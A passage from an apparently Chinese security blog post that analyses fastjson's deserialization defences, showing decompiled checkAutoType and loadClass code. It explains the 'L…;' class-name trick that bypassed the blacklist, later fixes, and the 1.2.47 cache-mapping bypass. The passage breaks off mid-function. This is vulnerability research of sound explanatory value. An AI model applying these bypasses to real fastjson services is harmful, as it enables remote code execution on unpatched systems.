<pre class=" language-java"><code class="language-java">List<span class="token operator">&lt;</span>FieldInfo<span class="token operator">></span> getters <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">computeGetters</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> <span class="token punctuation">(</span>JSONType<span class="token punctuation">)</span>clazz<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>JSONType<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
JSONObject json <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>getters<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Iterator var5 <span class="token operator">=</span> getters<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FieldInfo field <span class="token operator">=</span> <span class="token punctuation">(</span>FieldInfo<span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>javaObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    jsonValue <span class="token operator">=</span> <span class="token function">toJSON</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    json<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span>name<span class="token punctuation">,</span> jsonValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>fastjson反序列化的攻击点就在反序列化时对构造函数以及setter，getter的调用，即上述任意调用方式均可能造成反序列化漏洞</strong></p>
<h2 id="各版本漏洞及补丁"><a href="#各版本漏洞及补丁" class="headerlink" title="各版本漏洞及补丁"></a>各版本漏洞及补丁</h2><h3 id="1-2-25关闭autotype"><a href="#1-2-25关闭autotype" class="headerlink" title="1.2.25关闭autotype"></a>1.2.25关闭autotype</h3><p>更改pom.xml中的版本，代码不变，此时autotype已经被默认关闭，所以反序列化失败</p>
<p>整个autotype的检验就这段函数，第一个参数是类名，第二个参数是预期被反序列化的类（这个参数和1.2.68的一个关键绕过有关）</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span>String typeName<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> expectClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// 检测name是否为null</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            String className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">// 如果开了autoType</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">int</span> i<span class="token punctuation">;</span>
                String deny<span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">// 检测name是否在白名单中，是则直接load</span>
                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    deny <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">// 检测类是否在黑名单中，在黑名单中抛出异常</span>
                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    deny <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token comment" spellcheck="true">// 从已存在的两个map中获取class</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                clazz <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment" spellcheck="true">// 能从map中找到</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">// 没开autotype</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    String accept<span class="token punctuation">;</span>
                    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">// 查一遍黑名单，在黑名单就抛出异常</span>
                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        accept <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">// 查一遍白名单，在白名单内就加载</span>
                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        accept <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token comment" spellcheck="true">// 如果加载出来的类和预期类不一致则抛出异常</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>

                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">// 开了autotype，或者指定了反序列化类，直接进行加载(绝大多数都是从这进好像)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">// 黑名单过滤，后续还加了Rowset以防止JNDI注入</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token operator">||</span> DataSource<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">// 没开autotype，抛出异常</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>具体见注释</p>
<p>总的来说，步骤如下<br>如果开了autotype，先过白名单，在白名单中直接加载，再过黑名单<br>然后从缓存map和默认运行反序列化的基本类中去找，找得到就看目标类和预期类是否相同，相同即加载并返回<br>然后如果没开autotype，就又过一遍黑名单再过一遍白名单，在白名单中就看目标类和预期类是否相同，相同即加载并返回；<br>最后再看一眼开没开autotype，如果开了就加载，然后检查一下类是不是继承ClassLoader,DataSource之类的危险类，以及是否与期望类一致，都过了就返回（后面补充了RowSet这个类把之前提到的JdbcRowSetImpl给干掉了）<br>最后对所有没开autotype的情况抛出异常</p>
<p>这个autotype的关闭的防御几乎是超级防御了，理论上只有白名单中的类和map中存在且不再黑名单中的类和this.deserializers中定义的基本类可以被加载<br>从代码里可以看到，map中类的反序列化是不受autotype影响的，<code>TypeUtils.getClassFromMapping</code>是设计用于优化之前加载过的类的加载的，而<code>this.deserializers</code>则存放了一些常用的安全类，设计用来对常用类不需要autotype也能自动加载<br>最后也导致这里出现了一个非常严重的反序列化漏洞</p>
<h3 id="黑名单绕过和修复"><a href="#黑名单绕过和修复" class="headerlink" title="黑名单绕过和修复"></a>黑名单绕过和修复</h3><p>起初，在checkAutoType中的安全检查中，黑名单是以字符串的形式存在的，并且检测的方式是startWith，而在紧随其后的<code>TypeUtils.loadClass(typeName, this.defaultClassLoader);</code>中，却又对类名进行了额外处理，来了一手字符串截取，这样子将类名前面套一个<code>L</code>，后面补一个<code>;</code>就能绕过所有的黑名单检测</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">loadClass</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> ClassLoader classLoader<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>className <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token punctuation">)</span>mappings<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">// 这段，绕过ClassName开头是[或者L，截取一下</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'['</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> componentType <span class="token operator">=</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                String newClassName <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>newClassName<span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>classLoader <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    var6<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    ClassLoader contextClassLoader <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>contextClassLoader <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> contextClassLoader <span class="token operator">!=</span> classLoader<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        clazz <span class="token operator">=</span> contextClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    clazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>修复方案先是当类名以<code>L</code>开头，<code>;</code>结尾时，就把头尾的第一个字符去掉（双写就又绕了），后来又再检测了以<code>LL</code>开头就直接抛出异常，并且同样处理了<code>[</code>（但实际上如果硬塞方括号的话会因为json解析错误直接崩盘，但是在有一篇参考文章的评论区有奇怪的json能绕，可能是fastjson自己的解析问题），黑名单绕过就没得了，并且后来还将黑名单从字符串换成了hashcode，那就更没辙了，甚至都不知道黑名单的内容都是些啥<br>这里有一个仓库记录了黑名单hash对应的包<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a><br>且这里的黑名单绕过是在autotype开启的情况下才能进行（略微鸡肋，还是那个map超级绕过比较牛逼）</p>
<h3 id="lt-x3D-1-2-47超级漏洞"><a href="#lt-x3D-1-2-47超级漏洞" class="headerlink" title="&lt;&#x3D;1.2.47超级漏洞"></a>&lt;&#x3D;1.2.47超级漏洞</h3><p>看了下1.2.47的checkAutoType，就是把<code>[L;</code>之类的过滤变成了各种异或之类的算哈希，让人不能一眼看出来过滤了啥，黑名单也变成了算哈希，就需要暴力跑才能知道黑名单又过滤了啥了，但实际上还是和之前的逻辑一致</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span>String typeName<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> expectClass<span class="token punctuation">,</span> <span class="token keyword">int</span> features<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token operator">&amp;&amp;</span> typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            String className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> null<span class="token punctuation">;</span>
            <span class="token keyword">long</span> BASIC <span class="token operator">=</span> <span class="token operator">-</span>3750763034362895579L<span class="token punctuation">;</span>
            <span class="token keyword">long</span> PRIME <span class="token operator">=</span> 1099511628211L<span class="token punctuation">;</span>
            <span class="token keyword">long</span> h1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>h1 <span class="token operator">==</span> <span class="token operator">-</span>5808493101479473382L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h1 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">long</span> h3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L<span class="token punctuation">;</span>
                <span class="token keyword">long</span> hash<span class="token punctuation">;</span>
                <span class="token keyword">int</span> i<span class="token punctuation">;</span>
